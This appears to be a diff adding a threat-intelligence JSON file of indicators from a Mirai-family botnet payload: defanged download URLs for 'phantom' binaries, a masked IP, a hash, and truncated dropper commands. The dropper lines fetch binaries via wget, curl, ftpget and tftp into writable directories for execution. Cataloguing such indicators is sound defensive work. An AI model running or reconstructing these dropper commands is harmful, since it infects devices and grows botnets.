@@ -1,0 +1,218 @@
+[
+  {
+    "context": "Embedded URL in inbound payload",
+    "source": "strings",
+    "type": "url",
+    "value": "hxxp://91[.]92[.]42[.]XXX/bins/phantom.arm5;cat"
+  },
+  {
+    "context": "Embedded URL in inbound payload",
+    "source": "strings",
+    "type": "url",
+    "value": "hxxp://91[.]92[.]42[.]XXX/bins/phantom.x86;cat"
+  },
+  {
+    "context": "Embedded URL in inbound payload",
+    "source": "strings",
+    "type": "url",
+    "value": "hxxp://91[.]92[.]42[.]XXX/bins/phantom.arm6;"
+  },
+  {
+    "context": "Embedded URL in inbound payload",
+    "source": "strings",
+    "type": "url",
+    "value": "hxxp://91[.]92[.]42[.]XXX/bins/phantom.arm4;cat"
+  },
+  {
+    "context": "Embedded URL in inbound payload",
+    "source": "strings",
+    "type": "url",
+    "value": "hxxp://91[.]92[.]42[.]XXX/bins/phantom[.]mips;"
+  },
+  {
+    "context": "Embedded URL in inbound payload",
+    "source": "strings",
+    "type": "url",
+    "value": "hxxp://91[.]92[.]42[.]XXX/bins/phantom[.]mpsl;cat"
+  },
+  {
+    "context": "Embedded URL in inbound payload",
+    "source": "strings",
+    "type": "url",
+    "value": "hxxp://91[.]92[.]42[.]XXX/bins/phantom.arm4;"
+  },
+  {
+    "context": "Embedded URL in inbound payload",
+    "source": "strings",
+    "type": "url",
+    "value": "hxxp://91[.]92[.]42[.]XXX/bins/phantom[.]mpsl;"
+  },
+  {
+    "context": "Embedded URL in inbound payload",
+    "source": "strings",
+    "type": "url",
+    "value": "hxxp://91[.]92[.]42[.]XXX/bins/phantom.arm5;"
+  },
+  {
+    "context": "Embedded URL in inbound payload",
+    "source": "strings",
+    "type": "url",
+    "value": "hxxp://91[.]92[.]42[.]XXX/bins/phantom[.]mips;cat"
+  },
+  {
+    "context": "Embedded URL in inbound payload",
+    "source": "strings",
+    "type": "url",
+    "value": "hxxp://91[.]92[.]42[.]XXX/bins/phantom.x86;"
+  },
+  {
+    "context": "Embedded URL in inbound payload",
+    "source": "strings",
+    "type": "url",
+    "value": "hxxp://91[.]92[.]42[.]XXX/bins/phantom.arm6;cat"
+  },
+  {
+    "context": "Embedded IP in inbound payload",
+    "source": "static_analysis",
+    "type": "ip",
+    "value": "91[.]92[.]42.XXX"
+  },
+  {
+    "context": "Suspicious command in inbound payload",
+    "source": "strings",
+    "type": "command",
+    "value": "cp /bin/busybox /tmp/"
+  },
+  {
+    "context": "Suspicious command in inbound payload",
+    "source": "strings",
+    "type": "command",
+    "value": "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget hxxp://91[.]92[.]42[.]XXX/bins/phantom.x86; curl -O hxxp://91[.]92[.]4"
+  },
+  {
+    "context": "Suspicious command in inbound payload",
+    "source": "strings",
+    "type": "command",
+    "value": "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 91[.]92[.]42.XXX phantom.x8"
+  },
+  {
+    "context": "Suspicious command in inbound payload",
+    "source": "strings",
+    "type": "command",
+    "value": "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 91[.]92[.]42.XXX -c get phantom.x86;cat phantom.x86 >robben;chmo"
+  },
+  {
+    "context": "Suspicious command in inbound payload",
+    "source": "strings",
+    "type": "command",
+    "value": "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r phantom.x86 -g 91[.]92[.]42.XXX;cat phantom.x86 >robben;chmod"
+  },
+  {
+    "context": "Suspicious command in inbound payload",
+    "source": "strings",
+    "type": "command",
+    "value": "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget hxxp://91[.]92[.]42[.]XXX/bins/phantom[.]mips; curl -O hxxp://91[.]92[.]"
+  },
+  {
+    "context": "Suspicious command in inbound payload",
+    "source": "strings",
+    "type": "command",
+    "value": "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 91[.]92[.]42.XXX phantom.mi"
+  },
+  {
+    "context": "Suspicious command in inbound payload",
+    "source": "strings",
+    "type": "command",
+    "value": "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 91[.]92[.]42.XXX -c get phantom[.]mips;cat phantom[.]mips >robben;ch"
+  },
+  {
+    "context": "Suspicious command in inbound payload",
+    "source": "strings",
+    "type": "command",
+    "value": "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r phantom[.]mips -g 91[.]92[.]42.XXX;cat phantom[.]mips >robben;chm"
+  },
+  {
+    "context": "Suspicious command in inbound payload",
+    "source": "strings",
+    "type": "command",
+    "value": "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget hxxp://91[.]92[.]42[.]XXX/bins/phantom[.]mpsl; curl -O hxxp://91[.]92[.]"
+  },
+  {
+    "context": "Suspicious command in inbound payload",
+    "source": "strings",
+    "type": "command",
+    "value": "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 91[.]92[.]42.XXX phantom.mp"
+  },
+  {
+    "context": "Suspicious command in inbound payload",
+    "source": "strings",
+    "type": "command",
+    "value": "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 91[.]92[.]42.XXX -c get phantom[.]mpsl;cat phantom[.]mpsl >robben;ch"
+  },
+  {
+    "context": "Suspicious command in inbound payload",
+    "source": "strings",
+    "type": "command",
+    "value": "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r phantom[.]mpsl -g 91[.]92[.]42.XXX;cat phantom[.]mpsl >robben;chm"
+  },
+  {
+    "context": "Suspicious command in inbound payload",
+    "source": "strings",
+    "type": "command",
+    "value": "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget hxxp://91[.]92[.]42[.]XXX/bins/phantom.arm4; curl -O hxxp://91[.]92[.]"
+  },
+  {
+    "context": "Suspicious command in inbound payload",
+    "source": "strings",
+    "type": "command",
+    "value": "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 91[.]92[.]42.XXX phantom.ar"
+  },
+  {
+    "context": "Suspicious command in inbound payload",
+    "source": "strings",
+    "type": "command",
+    "value": "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 91[.]92[.]42.XXX -c get phantom.arm4;cat phantom.arm4 >robben;ch"
+  },
+  {
+    "context": "Suspicious command in inbound payload",
+    "source": "strings",
+    "type": "command",
+    "value": "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r phantom.arm4 -g 91[.]92[.]42.XXX;cat phantom.arm4 >robben;chm"
+  },
+  {
+    "context": "Suspicious command in inbound payload",
+    "source": "strings",
+    "type": "command",
+    "value": "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget hxxp://91[.]92[.]42[.]XXX/bins/phantom.arm5; curl -O hxxp://91[.]92[.]"
+  },
+  {
+    "context": "Suspicious command in inbound payload",
+    "source": "strings",
+    "type": "command",
+    "value": "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 91[.]92[.]42.XXX -c get phantom.arm5;cat phantom.arm5 >robben;ch"
+  },
+  {
+    "context": "Suspicious command in inbound payload",
+    "source": "strings",
+    "type": "command",
+    "value": "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r phantom.arm5 -g 91[.]92[.]42.XXX;cat phantom.arm5 >robben;chm"
+  },
+  {
+    "context": "Suspicious command in inbound payload",
+    "source": "strings",
+    "type": "command",
+    "value": "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget hxxp://91[.]92[.]42[.]XXX/bins/phantom.arm6; curl -O hxxp://91[.]92[.]"
+  },
+  {
+    "context": "Suspicious command in inbound payload",
+    "source": "strings",
+    "type": "command",
+    "value": "cd /tmp || cd /var/run || cd /mnt"
+  },
+  {
+    "context": "Inbound payload hash (mirai)",
+    "source": "static_analysis",
+    "type": "hash",
+    "value": "311408f2d8fbeb8f133894a5cc65f1645e87b25f80a09ea1c4aff01afe7f929f"
+  }
+]
